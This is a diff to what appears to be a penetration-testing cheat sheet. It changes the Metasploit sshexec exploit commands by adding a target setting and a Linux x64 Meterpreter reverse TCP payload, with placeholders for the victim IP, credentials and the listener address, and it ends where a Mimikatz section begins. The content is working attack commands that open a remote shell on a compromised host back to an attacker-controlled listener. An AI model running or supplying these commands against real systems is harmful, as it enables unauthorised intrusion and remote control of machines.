@@ -345,6 +345,8 @@ run SESSION=2,URL='<url_to_exe>',EXECUTE=<true>
 ## Options
 ```ruby
 use exploit/multi/ssh/sshexec
+set TARGET 1
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
 set SRVHOST <handler_listen_ip>
 set SRVPORT <handler_listen_port>
 set LHOST <payload_connect_to_ip>
@@ -357,7 +359,7 @@ set PASSWORD <password>
 ## Run
 ```ruby
 use exploit/multi/ssh/sshexec
-run -o SRVHOST=<handler_listen_ip>,SRVPORT=<handler_listen_port>,LHOST=<payload_connect_to_ip>,LPORT=<payload_connect_to_port>,RHOSTS=<ip>,USERNAME=<username>,PASSWORD=<password> <ip>
+run -o TARGET=1,PAYLOAD=linux/x64/meterpreter/reverse_tcp,SRVHOST=<handler_listen_ip>,SRVPORT=<handler_listen_port>,LHOST=<payload_connect_to_ip>,LPORT=<payload_connect_to_port>,RHOSTS=<ip>,USERNAME=<username>,PASSWORD=<password> <ip>
 ```
 
 # Mimikatz
